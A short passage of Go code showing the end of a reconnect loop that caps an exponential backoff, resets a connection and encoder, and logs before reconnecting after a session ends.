			if backoff > maxBackoff {
				backoff = maxBackoff
			}
			// Reset encoder/conn
			ag.conn = nil
			ag.enc = nil
			continue
		}
		// Clean disconnect -> reset backoff and reconnect
		log.Printf("[*] Session ended, reconnecting...")
		backoff = time.Second
		ag.conn = nil
		ag.enc = nil
		time.Sleep(backoff)
	}
}
